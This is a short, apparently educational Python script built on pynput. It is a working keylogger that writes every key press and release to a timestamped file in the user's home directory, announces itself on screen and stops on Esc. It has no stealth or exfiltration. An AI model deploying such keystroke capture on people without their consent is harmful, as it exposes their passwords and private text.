from pynput.keyboard import Key, Listener
import logging
import time
import os

# Set up the logging configuration
log_dir = os.path.join(os.path.expanduser('~'), "keylogger_project")
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Create log file with timestamp
log_file = os.path.join(log_dir, f"keylog_{time.strftime('%Y%m%d-%H%M%S')}.txt")

# Configure the logging
logging.basicConfig(
    filename=log_file,
    level=logging.INFO,
    format='%(asctime)s: %(message)s'
)

print(f"Keylogger started. Logging to {log_file}")
print("Press Esc key to stop the keylogger")

def on_press(key):
    try:
        # Log alphanumeric keys
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # Log special keys
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    logging.info(f"Key released: {key}")
    
    # Stop the keylogger if Esc is pressed
    if key == Key.esc:
        print("Keylogger stopped")
        return False

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
